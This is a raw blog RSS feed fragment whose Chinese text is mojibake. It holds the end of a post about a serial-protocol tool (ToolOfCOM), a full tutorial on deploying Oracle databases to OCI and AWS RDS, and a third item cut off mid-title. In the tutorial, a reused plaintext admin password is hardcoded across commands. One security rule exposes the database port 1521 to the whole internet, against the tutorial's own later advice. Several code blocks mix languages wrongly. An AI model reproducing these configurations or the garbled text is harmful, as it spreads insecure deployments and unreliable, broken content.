<table><thead><tr><th>åŠŸèƒ½</th><th>çŠ¶æ€</th></tr></thead><tbody><tr><td>XMODEM å‡çº§é“¾è·¯</td><td>âœ” MCU Bootloader æµ‹è¯•ç¥å™¨</td></tr><tr><td>Modbus RTU/ASCII/TCP</td><td>âœ” å·¥æ§ç°åœºç›´æ¥ç”¨</td></tr><tr><td>ä¸²å£/TCP æ··åˆé€šé“</td><td>âœ” å¯åˆ‡æ¢è¿è¡Œ</td></tr><tr><td>çŠ¶æ€æœºé©±åŠ¨è‡ªåŠ¨åŒ–æµ‹è¯•</td><td>âœ” æ— éœ€å†™ä»£ç </td></tr><tr><td>åè®®åŠ¨ä½œæ‰©å±•</td><td>âœ” ç»§æ‰¿ BaseProtocol å³å¯å¢åŠ åè®®</td></tr></tbody></table>
<p>ä½ ç”šè‡³å¯ä»¥æŠŠæŸä¸ªåè®®çš„æ‰§è¡Œé€»è¾‘<strong>æäº¤åˆ°ä»“åº“é‡Œå¤ç”¨</strong>ã€‚</p>
<p>åè®®ç¬¬ä¸€æ¬¡å˜æˆå¯ä»¥å…±äº«çš„èµ„äº§ã€‚</p>
<h2 data-id="heading-9">ğŸ§­ å®ƒçš„æœªæ¥ï¼ˆè¿™æ˜¯æ•´ä¸ªæ•…äº‹çš„å‡ç»´ç‚¹ï¼‰</h2>
<p>ToolOfCOM æ­£åœ¨æ‰“å¼€ä¸€ä¸ªå¯èƒ½æ€§ï¼š</p>
<pre><code class="hljs">åè®®ä¸å†æ˜¯ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œ
åè®®æœ¬èº«å°±æ˜¯ä¸€æ®µå¯ä»¥æ‰§è¡Œçš„è„šæœ¬ã€‚
</code></pre>
<p>ä»æ­¤ä»¥åï¼š</p>
<ul>
<li>äº§å“å‡çº§æ˜¯ YAML</li>
<li>è®¾å¤‡è°ƒè¯•æ˜¯ YAML</li>
<li>è‡ªåŠ¨åŒ–æµ‹è¯•æ˜¯ YAML</li>
<li>å·¥ç¨‹äº¤ä»˜ä¹Ÿæ˜¯ YAML</li>
</ul>
<p>å†ä¹Ÿä¸ä¼šæœ‰äººé—®ï¼š</p>
<blockquote>
<p>â€œæœ‰æ²¡æœ‰è¿™ä¸ªåè®®çš„ä¸Šä½æœºï¼Ÿâ€</p>
</blockquote>
<p>å› ä¸ºå›ç­”å°†å˜æˆï¼š</p>
<pre><code class="hljs">ç»™æˆ‘ YAMLï¼Œæˆ‘æ¥è·‘ã€‚
</code></pre>
<h2 data-id="heading-10">ğŸ å†™åœ¨æœ€å</h2>
<p>æˆ‘åšè¿™ä¸ªé¡¹ç›®ï¼Œä¸æ˜¯ä¸ºäº†åšä¸€ä¸ªæ›´å¥½çœ‹çš„ä¸²å£åŠ©æ‰‹ã€‚</p>
<p>è€Œæ˜¯ä¸ºäº†ç»™å·¥ç¨‹å¸ˆä¸€ä¸ª<strong>æ–°çš„è§†è§’</strong>ï¼š</p>
<blockquote>
<p><strong>é€šä¿¡ä¸æ˜¯å‘½ä»¤ï¼Œé€šä¿¡æ˜¯æµç¨‹ã€‚</strong> <strong>æµç¨‹ä¸è¯¥å†™æ­»åœ¨ä»£ç é‡Œï¼Œå®ƒåº”è¯¥è¢«æè¿°ã€å¤ç”¨ã€æ‰§è¡Œã€‚</strong></p>
</blockquote>
<p>ToolOfCOM è®©è¿™ä»¶äº‹çœŸæ­£å‘ç”Ÿäº†ã€‚</p>
<h2 data-id="heading-11">ğŸ“ é¡¹ç›®å¼€æºåœ°å€</h2>
<p>ğŸ‘‰ <strong>è¯„è®ºåŒºå¯è§</strong></p>
<h2 data-id="heading-12">ğŸŒŸ å¦‚æœè¿™ç¯‡æ–‡ç« æ”¹å˜äº†ä½ å¯¹â€œé€šä¿¡é€»è¾‘â€çš„ç†è§£ï¼Œ</h2>
<p>è¯·ç‚¹ä¸ªèµã€å…³æ³¨æˆ‘ï¼Œä¸‹ä¸€ç¯‡æˆ‘ä¼šç»§ç»­æ­å¼€ï¼š</p>
<p><strong>åè®®å³èµ„äº§ï¼Œæœªæ¥çš„å·¥ç¨‹åä½œä¼šæ˜¯ä»€ä¹ˆæ ·ï¼Ÿ</strong></p>
<p><strong>å…¨æ–‡å®Œ</strong> ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Oracleå…¥é—¨åˆ°åˆ åº“è·‘è·¯-17ã€‘å®æˆ˜æ¡ˆä¾‹ï¼šäº‘ç¯å¢ƒéƒ¨ç½²å®è·µ]]></title>    <link>https://juejin.cn/post/7580809247736725544</link>    <guid>https://juejin.cn/post/7580809247736725544</guid>    <pubDate>2025-12-08T04:56:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580809247736725544" data-draft-id="7580809247736709160" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Oracleå…¥é—¨åˆ°åˆ åº“è·‘è·¯-17ã€‘å®æˆ˜æ¡ˆä¾‹ï¼šäº‘ç¯å¢ƒéƒ¨ç½²å®è·µ"/> <meta itemprop="keywords" content="æ•°æ®åº“,Oracle,MySQL"/> <meta itemprop="datePublished" content="2025-12-08T04:56:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¶æ—¥å¤±çœ è€…"/> <meta itemprop="url" content="https://juejin.cn/user/3411111810444068"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Oracleå…¥é—¨åˆ°åˆ åº“è·‘è·¯-17ã€‘å®æˆ˜æ¡ˆä¾‹ï¼šäº‘ç¯å¢ƒéƒ¨ç½²å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3411111810444068/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¶æ—¥å¤±çœ è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:56:04.000Z" title="Mon Dec 08 2025 04:56:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.1 äº‘ç¯å¢ƒéƒ¨ç½²æ¦‚è¿°</h2>
<h3 data-id="heading-1">1.1.1 äº‘éƒ¨ç½²ä¼˜åŠ¿</h3>
<p>å°†Oracleæ•°æ®åº“éƒ¨ç½²åˆ°äº‘ç¯å¢ƒå…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>å¼¹æ€§æ‰©å±•</strong>ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚åŠ¨æ€è°ƒæ•´èµ„æºé…ç½®</li>
<li><strong>æˆæœ¬ä¼˜åŒ–</strong>ï¼šæŒ‰éœ€ä»˜è´¹ï¼Œé™ä½åŸºç¡€è®¾æ–½æŠ•å…¥</li>
<li><strong>é«˜å¯ç”¨æ€§</strong>ï¼šäº‘æœåŠ¡å•†æä¾›çš„SLAä¿éšœ</li>
<li><strong>ç®€åŒ–è¿ç»´</strong>ï¼šè‡ªåŠ¨åŒ–å¤‡ä»½ã€ç›‘æ§å’Œç»´æŠ¤</li>
<li><strong>å…¨çƒéƒ¨ç½²</strong>ï¼šå¿«é€Ÿåœ¨å…¨çƒèŒƒå›´å†…éƒ¨ç½²æ•°æ®åº“å®ä¾‹</li>
</ul>
<h3 data-id="heading-2">1.1.2 éƒ¨ç½²é€‰é¡¹</h3>
<ul>
<li><strong>Oracle Cloud Infrastructure (OCI)</strong>ï¼šåŸç”Ÿäº‘è§£å†³æ–¹æ¡ˆ</li>
<li><strong>AWS RDS for Oracle</strong>ï¼šæ‰˜ç®¡æ•°æ®åº“æœåŠ¡</li>
<li><strong>Azure Database for Oracle</strong>ï¼šå¾®è½¯äº‘æ‰˜ç®¡æœåŠ¡</li>
<li><strong>é˜¿é‡Œäº‘RDS for Oracle</strong>ï¼šå›½å†…äº‘æœåŠ¡å•†è§£å†³æ–¹æ¡ˆ</li>
</ul>
<h2 data-id="heading-3">1.2 OCIäº‘ç¯å¢ƒéƒ¨ç½²</h2>
<h3 data-id="heading-4">1.2.1 åˆ›å»ºæ•°æ®åº“å®ä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨OCI CLIåˆ›å»ºè‡ªæ²»æ•°æ®åº“</span>
oci db autonomous-database create \
  --compartment-id ocid1.compartment.oc1..example \
  --db-name <span class="hljs-string">"MyFinanceDB"</span> \
  --cpu-core-count 2 \
  --data-storage-size-in-tbs 1 \
  --admin-password <span class="hljs-string">"StrongPassword123!"</span> \
  --license-model LICENSE_INCLUDED \
  --display-name <span class="hljs-string">"Finance Production Database"</span>

<span class="hljs-comment"># ä½¿ç”¨Terraformåˆ›å»ºåŸºç¡€è®¾æ–½</span>
resource <span class="hljs-string">"oci_database_autonomous_database"</span> <span class="hljs-string">"finance_adb"</span> {
  compartment_id = var.compartment_ocid
  db_name        = <span class="hljs-string">"MyFinanceDB"</span>
  cpu_core_count = 2
  data_storage_size_in_tbs = 1
  admin_password = <span class="hljs-string">"StrongPassword123!"</span>
  license_model  = <span class="hljs-string">"LICENSE_INCLUDED"</span>
  display_name   = <span class="hljs-string">"Finance Production Database"</span>
}
</code></pre>
<h3 data-id="heading-5">1.2.2 ç½‘ç»œå®‰å…¨é…ç½®</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºè™šæ‹Ÿäº‘ç½‘ç»œ(VCN)</span>
oci network vcn create \
  --compartment-id ocid1.compartment.oc1..example \
  --cidr-block <span class="hljs-string">"10.0.0.0/16"</span> \
  --display-name <span class="hljs-string">"FinanceVCN"</span>

<span class="hljs-comment"># åˆ›å»ºå®‰å…¨åˆ—è¡¨</span>
oci network security-list create \
  --compartment-id ocid1.compartment.oc1..example \
  --vcn-id ocid1.vcn.oc1..example \
  --display-name <span class="hljs-string">"FinanceSecurityList"</span> \
  --egress-security-rules <span class="hljs-string">'[{"destination": "0.0.0.0/0", "protocol": "all"}]'</span> \
  --ingress-security-rules <span class="hljs-string">'[{"source": "0.0.0.0/0", "protocol": "6", "tcp-options": {"destination-port-range": {"min": 1521, "max": 1521}}}]'</span>
</code></pre>
<h2 data-id="heading-6">1.3 AWSäº‘ç¯å¢ƒéƒ¨ç½²</h2>
<h3 data-id="heading-7">1.3.1 ä½¿ç”¨RDSåˆ›å»ºOracleå®ä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨AWS CLIåˆ›å»ºRDS Oracleå®ä¾‹</span>
aws rds create-db-instance \
  --db-instance-identifier finance-oracle-db \
  --db-instance-class db.t3.large \
  --engine oracle-ee \
  --master-username admin \
  --master-user-password StrongPassword123! \
  --allocated-storage 100 \
  --storage-type gp2 \
  --vpc-security-group-ids sg-12345678 \
  --db-subnet-group-name finance-db-subnet-group

<span class="hljs-comment"># ä½¿ç”¨CloudFormationæ¨¡æ¿</span>
AWSTemplateFormatVersion: <span class="hljs-string">'2010-09-09'</span>
Resources:
  FinanceDB:
    Type: AWS::RDS::DBInstance
    Properties:
      DBInstanceIdentifier: finance-oracle-db
      DBInstanceClass: db.t3.large
      Engine: oracle-ee
      MasterUsername: admin
      MasterUserPassword: StrongPassword123!
      AllocatedStorage: 100
      StorageType: gp2
      VPCSecurityGroups:
        - sg-12345678
      DBSubnetGroupName: finance-db-subnet-group
</code></pre>
<h3 data-id="heading-8">1.3.2 æ•°æ®åº“è¿æ¥é…ç½®</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- é…ç½®å®¢æˆ·ç«¯è¿æ¥</span>
<span class="hljs-comment">-- åœ¨tnsnames.oraä¸­æ·»åŠ </span>
FINANCE_DB <span class="hljs-operator">=</span>
  (DESCRIPTION <span class="hljs-operator">=</span>
    (ADDRESS_LIST <span class="hljs-operator">=</span>
      (ADDRESS <span class="hljs-operator">=</span> (PROTOCOL <span class="hljs-operator">=</span> TCP)(HOST <span class="hljs-operator">=</span> finance<span class="hljs-operator">-</span>oracle<span class="hljs-operator">-</span>db.cluster<span class="hljs-operator">-</span>xyz.us<span class="hljs-operator">-</span>west<span class="hljs-number">-2.</span>rds.amazonaws.com)(PORT <span class="hljs-operator">=</span> <span class="hljs-number">1521</span>))
    )
    (CONNECT_DATA <span class="hljs-operator">=</span>
      (SID <span class="hljs-operator">=</span> ORCL)
    )
  )

<span class="hljs-comment">-- æµ‹è¯•è¿æ¥</span>
sqlplus admin<span class="hljs-operator">/</span>StrongPassword123<span class="hljs-operator">!</span><span class="hljs-variable">@FINANCE</span>_DB
</code></pre>
<h2 data-id="heading-9">1.4 æ•°æ®åº“è¿ç§»ä¸Šäº‘</h2>
<h3 data-id="heading-10">1.4.1 ä½¿ç”¨Data Pumpè¿ç§»</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨æœ¬åœ°æ•°æ®åº“å¯¼å‡ºæ•°æ®</span>
expdp system/password@local_db DIRECTORY=data_pump_dir DUMPFILE=finance_export.dmp SCHEMAS=FINANCE COMPRESSION=ALL

<span class="hljs-comment"># å°†å¯¼å‡ºæ–‡ä»¶ä¸Šä¼ åˆ°äº‘å­˜å‚¨</span>
aws s3 <span class="hljs-built_in">cp</span> /backup/finance_export.dmp s3://finance-backup-bucket/

<span class="hljs-comment"># åœ¨äº‘æ•°æ®åº“ä¸­åˆ›å»ºç›®å½•å¯¹è±¡</span>
CREATE DIRECTORY cloud_backup_dir AS <span class="hljs-string">'/opt/oracle/dumpfiles'</span>;

<span class="hljs-comment"># ä»äº‘å­˜å‚¨ä¸‹è½½å¹¶å¯¼å…¥æ•°æ®</span>
aws s3 <span class="hljs-built_in">cp</span> s3://finance-backup-bucket/finance_export.dmp /opt/oracle/dumpfiles/
impdp admin/StrongPassword123!@cloud_db DIRECTORY=cloud_backup_dir DUMPFILE=finance_export.dmp SCHEMAS=FINANCE
</code></pre>
<h3 data-id="heading-11">1.4.2 ä½¿ç”¨RMANè¿ç§»</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åœ¨æºæ•°æ®åº“åˆ›å»ºå¤‡ä»½</span>
RMAN TARGET <span class="hljs-operator">/</span>
CONFIGURE CHANNEL DEVICE TYPE DISK FORMAT <span class="hljs-string">'/backup/%U'</span>;
BACKUP DATABASE PLUS ARCHIVELOG;

<span class="hljs-comment">-- å°†å¤‡ä»½æ–‡ä»¶ä¼ è¾“åˆ°äº‘ç¯å¢ƒ</span>
scp <span class="hljs-operator">/</span>backup<span class="hljs-comment">/* ec2-user@ec2-instance:/home/ec2-user/backup/

-- åœ¨ç›®æ ‡äº‘æ•°æ®åº“æ¢å¤
RMAN TARGET /
STARTUP NOMOUNT;
RESTORE SPFILE FROM '/home/ec2-user/backup/spfile_backup';
SHUTDOWN IMMEDIATE;
STARTUP NOMOUNT;
RESTORE CONTROLFILE FROM '/home/ec2-user/backup/controlfile_backup';
ALTER DATABASE MOUNT;
RESTORE DATABASE;
RECOVER DATABASE;
ALTER DATABASE OPEN RESETLOGS;
</span></code></pre>
<h2 data-id="heading-12">1.5 äº‘ç¯å¢ƒç›‘æ§å’Œä¼˜åŒ–</h2>
<h3 data-id="heading-13">1.5.1 æ€§èƒ½ç›‘æ§</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ç›‘æ§æ•°æ®åº“æ€§èƒ½æŒ‡æ ‡</span>
<span class="hljs-keyword">SELECT</span> 
  metric_name,
  <span class="hljs-keyword">value</span>,
  begin_time,
  end_time
<span class="hljs-keyword">FROM</span> v$rsrcmgrmetric_history
<span class="hljs-keyword">WHERE</span> metric_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'CPU Usage Per Sec'</span>, <span class="hljs-string">'Memory Usage Per Sec'</span>)
<span class="hljs-keyword">AND</span> begin_time <span class="hljs-operator">&gt;</span> SYSDATE <span class="hljs-operator">-</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> begin_time;

<span class="hljs-comment">-- ç›‘æ§ä¼šè¯å’Œè¿æ¥</span>
<span class="hljs-keyword">SELECT</span> 
  sid,
  serial#,
  username,
  program,
  machine,
  status,
  last_call_et
<span class="hljs-keyword">FROM</span> v$session
<span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> last_call_et <span class="hljs-keyword">DESC</span>;
</code></pre>
<h3 data-id="heading-14">1.5.2 è‡ªåŠ¨åŒ–è¿ç»´</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨Lambdaå‡½æ•°è‡ªåŠ¨æ‰©å±•æ•°æ®åº“</span>
import boto3

def lambda_handler(event, context):
    rds = boto3.client(<span class="hljs-string">'rds'</span>)
    
    <span class="hljs-comment"># è·å–å½“å‰æ•°æ®åº“å®ä¾‹ä¿¡æ¯</span>
    response = rds.describe_db_instances(DBInstanceIdentifier=<span class="hljs-string">'finance-oracle-db'</span>)
    current_class = response[<span class="hljs-string">'DBInstances'</span>][0][<span class="hljs-string">'DBInstanceClass'</span>]
    
    <span class="hljs-comment"># æ ¹æ®CPUä½¿ç”¨ç‡è°ƒæ•´å®ä¾‹è§„æ ¼</span>
    <span class="hljs-keyword">if</span> event[<span class="hljs-string">'cpu_utilization'</span>] &gt; 80:
        new_class = <span class="hljs-string">'db.t3.xlarge'</span>
        rds.modify_db_instance(
            DBInstanceIdentifier=<span class="hljs-string">'finance-oracle-db'</span>,
            DBInstanceClass=new_class,
            ApplyImmediately=True
        )
    
    <span class="hljs-built_in">return</span> {<span class="hljs-string">'statusCode'</span>: 200, <span class="hljs-string">'body'</span>: <span class="hljs-string">'Scaling operation completed'</span>}
</code></pre>
<h2 data-id="heading-15">1.6 å®‰å…¨æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-16">1.6.1 è®¿é—®æ§åˆ¶</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ›å»ºæœ€å°æƒé™ç”¨æˆ·</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> app_user IDENTIFIED <span class="hljs-keyword">BY</span> AppPassword123<span class="hljs-operator">!</span>;
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">CREATE</span> SESSION <span class="hljs-keyword">TO</span> app_user;
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>, <span class="hljs-keyword">INSERT</span>, <span class="hljs-keyword">UPDATE</span>, <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">ON</span> FINANCE.TRANSACTIONS <span class="hljs-keyword">TO</span> app_user;

<span class="hljs-comment">-- é…ç½®ç½‘ç»œè®¿é—®æ§åˆ¶</span>
<span class="hljs-comment">-- åœ¨å®‰å…¨ç»„ä¸­é™åˆ¶è®¿é—®æºIP</span>
aws ec2 authorize<span class="hljs-operator">-</span>security<span class="hljs-operator">-</span><span class="hljs-keyword">group</span><span class="hljs-operator">-</span>ingress \
  <span class="hljs-comment">--group-id sg-12345678 \</span>
  <span class="hljs-comment">--protocol tcp \</span>
  <span class="hljs-comment">--port 1521 \</span>
  <span class="hljs-comment">--cidr 10.0.0.0/8</span>
</code></pre>
<h3 data-id="heading-17">1.6.2 æ•°æ®åŠ å¯†</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å¯ç”¨é€æ˜æ•°æ®åŠ å¯†</span>
ADMINISTER KEY MANAGEMENT <span class="hljs-keyword">SET</span> KEYSTORE <span class="hljs-keyword">OPEN</span> IDENTIFIED <span class="hljs-keyword">BY</span> wallet_password;
ADMINISTER KEY MANAGEMENT <span class="hljs-keyword">SET</span> KEY IDENTIFIED <span class="hljs-keyword">BY</span> wallet_password <span class="hljs-keyword">WITH</span> BACKUP;

<span class="hljs-comment">-- åˆ›å»ºåŠ å¯†è¡¨ç©ºé—´</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span>SPACE encrypted_ts
DATAFILE <span class="hljs-string">'/u01/app/oracle/oradata/ORCL/encrypted_ts.dbf'</span> SIZE <span class="hljs-number">100</span>M
ENCRYPTION <span class="hljs-keyword">USING</span> <span class="hljs-string">'AES256'</span>
<span class="hljs-keyword">DEFAULT</span> STORAGE(ENCRYPT);
</code></pre>
<h2 data-id="heading-18">1.7 å®è·µç»ƒä¹ </h2>
<h3 data-id="heading-19">ç»ƒä¹ 1ï¼šåœ¨OCIä¸Šéƒ¨ç½²Oracleè‡ªæ²»æ•°æ®åº“</h3>
<ol>
<li>åˆ›å»ºOCIè´¦æˆ·å¹¶é…ç½®CLI</li>
<li>ä½¿ç”¨CLIåˆ›å»ºè‡ªæ²»æ•°æ®åº“å®ä¾‹</li>
<li>é…ç½®ç½‘ç»œå’Œå®‰å…¨è§„åˆ™</li>
<li>è¿æ¥åˆ°æ•°æ®åº“å¹¶æ‰§è¡ŒåŸºæœ¬æ“ä½œ</li>
</ol>
<h3 data-id="heading-20">ç»ƒä¹ 2ï¼šå°†æœ¬åœ°æ•°æ®åº“è¿ç§»åˆ°AWS RDS</h3>
<ol>
<li>åœ¨æœ¬åœ°æ•°æ®åº“åˆ›å»ºå¤‡ä»½</li>
<li>ä½¿ç”¨Data Pumpå¯¼å‡ºæ•°æ®</li>
<li>åœ¨AWSä¸Šåˆ›å»ºRDS Oracleå®ä¾‹</li>
<li>å°†æ•°æ®å¯¼å…¥åˆ°RDSå®ä¾‹</li>
</ol>
<h3 data-id="heading-21">ç»ƒä¹ 3ï¼šé…ç½®äº‘ç¯å¢ƒç›‘æ§å’Œå‘Šè­¦</h3>
<ol>
<li>è®¾ç½®æ•°æ®åº“æ€§èƒ½ç›‘æ§</li>
<li>é…ç½®è‡ªåŠ¨æ‰©å±•ç­–ç•¥</li>
<li>åˆ›å»ºå‘Šè­¦è§„åˆ™ç›‘æ§å…³é”®æŒ‡æ ‡</li>
<li>æµ‹è¯•è‡ªåŠ¨æ‰©å±•åŠŸèƒ½</li>
</ol>
<h2 data-id="heading-22">1.8 æ€»ç»“</h2>
<p>äº‘ç¯å¢ƒéƒ¨ç½²ä¸ºOracleæ•°æ®åº“å¸¦æ¥äº†æ–°çš„æœºé‡å’ŒæŒ‘æˆ˜ã€‚é€šè¿‡åˆç†é€‰æ‹©äº‘æœåŠ¡å•†å’Œéƒ¨ç½²æ–¹æ¡ˆï¼Œå¯ä»¥æ˜¾è‘—æå‡æ•°æ®åº“çš„å¯ç”¨æ€§ã€å¯æ‰©å±•æ€§å’Œè¿ç»´æ•ˆç‡ã€‚åœ¨å®é™…éƒ¨ç½²è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å……åˆ†è€ƒè™‘å®‰å…¨æ€§ã€æ€§èƒ½ä¼˜åŒ–å’Œæˆæœ¬æ§åˆ¶ç­‰å› ç´ ï¼Œå¹¶å»ºç«‹å®Œå–„çš„ç›‘æ§å’Œè¿ç»´ä½“ç³»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å›½é™…åŒ–æ–¹æ¡ˆï¼šå¤šç¯å¢ƒã€å¤šè¯­è¨€ã€åŠ¨æ€åŠ 